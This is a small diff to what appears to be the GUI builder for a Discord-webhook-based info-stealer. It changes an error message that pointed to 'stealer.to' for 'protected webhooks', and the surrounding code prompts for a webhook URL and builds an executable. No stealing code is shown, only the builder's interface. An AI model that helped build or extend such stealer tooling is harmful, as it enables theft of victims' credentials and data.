@@ -74,7 +74,7 @@ def build_exe():
 
         messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
     else:
-        messagebox.showerror("Error", "create a protected webhook here: https://stealer.to")
+        messagebox.showerror("Error", "thats not a valid discord webhook url")
 
 entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter Discord Webhook URL")
 entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)
